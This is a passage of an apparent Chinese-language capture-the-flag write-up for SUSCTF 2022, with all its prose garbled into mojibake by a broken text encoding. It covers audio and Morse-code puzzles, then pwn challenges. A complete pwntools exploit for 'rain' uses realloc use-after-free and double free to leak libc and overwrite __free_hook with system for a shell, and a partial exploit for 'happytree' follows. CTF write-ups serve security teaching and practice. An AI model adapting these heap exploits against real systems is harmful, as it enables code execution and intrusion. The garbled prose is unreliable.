äºæ˜¯å°†æ‰€æœ‰æ»¡è¶³çš„ç å­—çš„äºŒè¿›åˆ¶æ•°æ®ç›¸åŠ ä¹‹åå»sha256å¾—åˆ°flagï¼šSUSCTF{c17019990bf57492cddf24f3cc3be588507b2d567934a101d4de2fa6d606b5c1}</p><h2 id=audio>AUDIO</h2><p>å¬fromfreiendçš„éŸ³é¢‘å¯ä»¥åœ¨30séƒ¨åˆ†å¬è§æ¯”è¾ƒæ˜æ˜¾çš„morseç”µç å£°éŸ³,è€ŒåŸå§‹éŸ³é¢‘æ— æ‚éŸ³ã€‚å› æ­¤çŒœæµ‹æ˜¯å¦ä¸¤è€…å¯ä»¥è¿›è¡Œå åŠ è€Œæ¶ˆé™¤è€Œåªä¿ç•™morseç”µç å£°éŸ³,ç½‘ä¸Šæœäº†ä¸€ä¸‹,å‘ç°bç«™æ•™ç¨‹ä¸€å¤§å †,å¤§éƒ¨åˆ†éƒ½æ˜¯ç”¨auè¿›è¡Œã€‚éšä¾¿ä¹±è°ƒ,å‘ç°åœ¨ç­‰äº-6dBæ—¶å¯ä»¥åªå¬è§æ¸…æ™°çš„ç”µç å£°éŸ³,äºæ˜¯å¼€å§‹å¯¼å‡ºæ–‡ä»¶çœ‹é¢‘è°±,å¯ä»¥å¾ˆæ¸…æ™°å¾—çœ‹åˆ°æ˜æ˜¾çš„morseç”µç 
<img src=/img/2022-2-28-SUSCTF/20220301005626383.jpg alt=img></p><p>&mldr; ..- &mldr; -.-. - ..-. &ndash; .- &mldr; - . .-. &mdash; ..-. .- ..- -.. .. &mdash;
<img src=/img/2022-2-28-SUSCTF/20220301005626207.jpg alt=img>
æœ€ååŠ ä¸Š{}
SUSCTF{MASTEROFAUDIO}</p><h2 id=misound>misound</h2><h3 id=éé¢„æœŸ>éé¢„æœŸ</h3><p>éŸ³é¢‘ä¸¢è¿›Silenteyeå¾—åˆ°base64è§£ç åå†…å®¹ä¸º
207 359 220 224 352 315 359 374 290 310 277 507 391 513 423 392 508 383 440 322 420 427 503 460 295 318 245 302 407 414 410 130 369 317</p><p>Auçœ‹é¢‘è°±å¾—åˆ°å­—ç¬¦ä¸² AnEWmuLTiPLyis_etimes_wiLLbEcomE_B
åˆ†å‰²ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯
a new multiply is e times _ will become b
<img src=/img/2022-2-28-SUSCTF/20220301005626343.jpg alt=img>
ç¿»è¯‘å¾—åˆ°ï¼šä¸€ä¸ªæ–°çš„ä¹˜æ³•æ˜¯eä¹˜ä»¥_å°†å˜æˆb
hint:ä¹˜æ³•ä½¿ç”¨ASCIIç ç›¸ä¹˜
_çš„ASCIIå€¼æ˜¯95</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;207&#39;</span><span class=p>,</span><span class=s1>&#39; 359&#39;</span><span class=p>,</span><span class=s1>&#39; 220&#39;</span><span class=p>,</span><span class=s1>&#39; 224 &#39;</span><span class=p>,</span><span class=s1>&#39;352 &#39;</span><span class=p>,</span><span class=s1>&#39;315 &#39;</span><span class=p>,</span><span class=s1>&#39;359 &#39;</span><span class=p>,</span><span class=s1>&#39;374&#39;</span><span class=p>,</span><span class=s1>&#39; 290 &#39;</span><span class=p>,</span><span class=s1>&#39;310&#39;</span><span class=p>,</span><span class=s1>&#39; 277&#39;</span><span class=p>,</span><span class=s1>&#39; 507 &#39;</span><span class=p>,</span><span class=s1>&#39;391 &#39;</span><span class=p>,</span><span class=s1>&#39;513 &#39;</span><span class=p>,</span><span class=s1>&#39;423&#39;</span><span class=p>,</span><span class=s1>&#39; 392 &#39;</span><span class=p>,</span><span class=s1>&#39;508 &#39;</span><span class=p>,</span><span class=s1>&#39;383&#39;</span><span class=p>,</span><span class=s1>&#39; 440 &#39;</span><span class=p>,</span><span class=s1>&#39;322&#39;</span><span class=p>,</span><span class=s1>&#39; 420&#39;</span><span class=p>,</span><span class=s1>&#39; 427&#39;</span><span class=p>,</span><span class=s1>&#39; 503 &#39;</span><span class=p>,</span><span class=s1>&#39;460 &#39;</span><span class=p>,</span><span class=s1>&#39;295&#39;</span><span class=p>,</span><span class=s1>&#39; 318 &#39;</span><span class=p>,</span><span class=s1>&#39;245&#39;</span><span class=p>,</span><span class=s1>&#39; 302 &#39;</span><span class=p>,</span><span class=s1>&#39;407&#39;</span><span class=p>,</span><span class=s1>&#39; 414&#39;</span><span class=p>,</span><span class=s1>&#39; 410&#39;</span><span class=p>,</span><span class=s1>&#39; 130 &#39;</span><span class=p>,</span><span class=s1>&#39;369 &#39;</span><span class=p>,</span><span class=s1>&#39;317&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=s1>&#39;AnEWmuLTiPLyis_etimes_wiLLbEcomE_B&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#ä¸€ä¸ªæ–°çš„ä¹˜æ³•æ˜¯eä¹˜ä»¥uå°†å˜æˆb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#369å¯ä»¥æ˜¯ç”¨_ä¸‹æ ‡æˆ–è€…å¾ªç¯æ±‚å‡ºæ¥</span>
</span></span><span class=line><span class=cl><span class=c1>#print(((ord(&#39;_&#39;) * ord(&#39;e&#39;))/num[i]))</span>
</span></span><span class=line><span class=cl><span class=c1>#å½“num[i]ç­‰äº369æ—¶å€™ï¼Œå€¼æœ€æ¥è¿‘æ•´æ•°#26.00271002710027</span>
</span></span><span class=line><span class=cl><span class=c1>#ç„¶åè®¡ç®—äº†ä¸€ä¸‹95*101å’Œ369*26çš„æ˜¯ç›¸å·®æ˜¯1</span>
</span></span><span class=line><span class=cl><span class=c1>#çŒœæµ‹åŠ å¯†ç®—æ³•95*101=369*26+1</span>
</span></span><span class=line><span class=cl><span class=c1>#æµ‹è¯•çŒœæƒ³ï¼šï¼ˆ207*26+1ï¼‰/65ç­‰äº82.8å‘ä¸Šå–æ•´æ˜¯83ï¼Œç„¶åæ˜¯Så­—ç¬¦</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>flag</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>round</span><span class=p>((</span><span class=nb>int</span><span class=p>(</span><span class=n>num</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>*</span> <span class=mi>26</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span><span class=o>/</span><span class=nb>ord</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>])))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ï¼ˆå±äºæ˜¯ç»å…¸éé¢„æœŸäº†ï¼Œç”±äºä¹˜ç§¯å‡ºæ¥çš„æ•°è¶³å¤Ÿå¤§ï¼Œè¿™é‡Œçš„ +1 å…¶å®åœ¨ä¸€å®šèŒƒå›´å†…å–å€¼éƒ½è¡Œï¼Œéƒ½æ²¡ç”¨åˆ° SSTV é‚£ä¸œè¥¿ hhh</p><h1 id=pwn>Pwn</h1><h2 id=rain>rain</h2><p>è¿™é¢˜ä¹Ÿä¸éœ€è¦å®Œå…¨é€†å®Œï¼Œå°±æŠ“å¯èƒ½äº§ç”Ÿæ¼æ´çš„åœ°æ–¹åˆ†ææ„é€ å°±å¥½ã€‚é¦–å…ˆï¼Œå¾ˆå®¹æ˜“å…³æ³¨åˆ°<code>config</code>ä¸­<code>realloc</code>é‚£é‡Œï¼Œå½“<code>size = 0</code>çš„æ—¶å€™ï¼Œç›¸å½“äº<code>free</code>ï¼Œç„¶åå†é€šè¿‡<code>realloc</code>å¾€è¿™ä¸ªå·²ç»åœ¨<code>tcache</code>ä¸­çš„å †å—å†™å…¥æ•°æ®ï¼Œä¿®æ”¹å…¶<code>next</code>æŒ‡é’ˆï¼ˆå…¶å®å°±æ˜¯ä¸ª<code>UAF</code>ï¼‰ï¼Œå°±å¯ä»¥è¿›è¡ŒåŠ«æŒäº†ï¼Œè¿™é‡Œç”±äºæ˜¯<code>2.27(1.2)</code>ç‰ˆæœ¬çš„<code>libc</code>ï¼Œå› æ­¤è¿˜å¯ä»¥è¿›è¡Œ<code>double free</code>ã€‚ä¸è¿‡ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªåœ°æ–¹è¦è€ƒè™‘ä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯éœ€è¦æ³„éœ²<code>libc</code>çš„åŸºåœ°å€ï¼Œç¬¬äºŒä¸ªå°±æ˜¯å¦‚ä½•å°†æˆ‘ä»¬ä¼ªé€ çš„å †å—ç”³è¯·å‡ºæ¥ã€‚å¯¹äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å®¹æ˜“æƒ³åˆ°ï¼Œå¯ä»¥é€šè¿‡æ›´æ”¹å­˜æ”¾å­—æ¯è¡¨çš„åœ°å€ï¼Œå†æ‰“å°å‡ºæ¥ï¼Œå°±èƒ½é€ æˆä¿¡æ¯æ³„éœ²äº†ï¼Œæ—¢ç„¶è¦æ›´æ”¹å­˜æ”¾å­—æ¯è¡¨çš„åœ°å€ï¼Œè‡ªç„¶æœ€æ–¹ä¾¿çš„å°±æ˜¯åŠ«æŒæ•´ä¸ªç»“æ„ä½“äº†ï¼Œæˆ‘ä»¬ç”¨<code>raining</code>åˆ·æ–°ä¸€ä¸‹åï¼Œä¼šé€šè¿‡<code>malloc(0x40)</code>ç”³è¯·ä¸€ä¸ªå †å—å­˜æ”¾è¿™ä¸ªç»“æ„ä½“ï¼Œè€Œæˆ‘ä»¬å¯ä»¥åœ¨ä¹‹å‰é€šè¿‡<code>realloc</code>é‚£é‡Œ<code>double free</code>ä¸€ä¸ª<code>0x50</code>çš„å †å—ï¼Œè¿™é‡Œå°±ä¼šç”³è¯·å‡ºå…¶ä¸­ä¸€ä¸ªå­˜æ”¾è¿™ä¸ªç»“æ„ä½“ï¼Œè€Œåœ¨ä¹‹åæˆ‘ä»¬å†ç”¨<code>realloc</code>ç”³è¯·å‡ºå¦å¤–ä¸€ä¸ªï¼Œå°±å¯ä»¥åŠ«æŒåˆ°ç»“æ„ä½“äº†ï¼Œè¿™é‡Œç”±äºæ²¡å¼€<code>PIE</code>ï¼Œæ•…ç›´æ¥å°†å­˜æ”¾å­—æ¯è¡¨çš„åœ°å€æ”¹æˆæŸä¸ª<code>elf</code>çš„<code>got</code>è¡¨åœ°å€ï¼Œå°±å¯ä»¥æ³„éœ²å‡º<code>libc</code>åŸºåœ°å€äº†ã€‚å†è€ƒè™‘ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå¦‚ä½•ç”³è¯·å‡ºä¼ªé€ çš„å †å—ï¼Œå…¶å®æ€è·¯æ˜¯ç±»ä¼¼åœ°ï¼Œå…ˆç”¨<code>raining</code>åˆ·æ–°åï¼Œé€šè¿‡ç”³è¯·ç»“æ„ä½“é‚£é‡Œç”³è¯·å‡ºä¸€ä¸ªå †å—ï¼Œå†åœ¨ä¹‹å<code>realloc</code>ç”³è¯·å‡ºçš„å°±æ˜¯ä¼ªé€ çš„å †å—äº†ï¼Œä¹Ÿå°±å¯ä»¥è¿›è¡Œä»»æ„å†™äº†ï¼Œè¿™é‡ŒåŠ«æŒçš„æ˜¯<code>__free_hook</code>ï¼Œå†é€šè¿‡<code>realloc(0)</code>è°ƒç”¨<code>free</code>å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#io = process(&#39;./rain&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;124.71.185.75&#39;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./rain&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_data</span><span class=p>(</span><span class=n>heigh</span><span class=p>,</span> <span class=n>width</span><span class=p>,</span> <span class=n>front_color</span><span class=p>,</span> <span class=n>back_color</span><span class=p>,</span> <span class=n>rainfall</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;ch&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>heigh</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>width</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=n>front_color</span><span class=p>)</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=n>back_color</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>rainfall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>18</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>content</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;FRAME&gt; &#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;ch&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x2</span><span class=p>,</span> <span class=mh>0x1</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x58</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;ch&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x20</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400E17</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x2</span><span class=p>,</span> <span class=mh>0x1</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;ch&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Table:            &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;ch&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x2</span><span class=p>,</span> <span class=mh>0x1</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;ch&gt; &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x38</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_data</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=happytree>happytree</h2><p>äºŒå‰æ’åºæ ‘åœ¨åˆ é™¤æ ¹èŠ‚ç‚¹æ—¶,ä¼šæŠŠä»–ç¬¬ä¸€ä¸ªå³å­æ ‘çš„æœ€å°å·¦å­æ ‘å’Œæ ¹èŠ‚ç‚¹å†…å®¹äº’æ¢ç„¶ååˆ é™¤æœ€å°å·¦å­æ ‘çš„å †å—,ä½†æ˜¯åˆ é™¤å †å—æ—¶å·¦å³å­æ ‘çš„æŒ‡é’ˆå¹¶æœªæ¸…ç©º,å¦‚æœé‡æ–°å°†å…¶mallocå‡ºæ¥å°±ä¼šå¯¼è‡´åŸæ¥è¢«åˆ é™¤çš„é‚£ä¸ªèŠ‚ç‚¹ä»–çš„å·¦å³å­æ ‘æŒ‡é’ˆä»å¾—åˆ°ä¿ç•™,å› æ­¤å¯ä»¥å¾—åˆ°ä¸€æ¬¡double free 2.27æœªåšé™åˆ¶,ç›´æ¥ä¿®æ”¹free_hookä¸ºsystemå³å¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span> <span class=s1>&#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span><span class=s1>&#39;sp&#39;</span><span class=p>,</span><span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># sh = process(&#39;./happytree&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;124.71.147.225&#34;</span><span class=p>,</span><span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># </span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>choice</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;cmd&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>choice</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;data:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;content:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
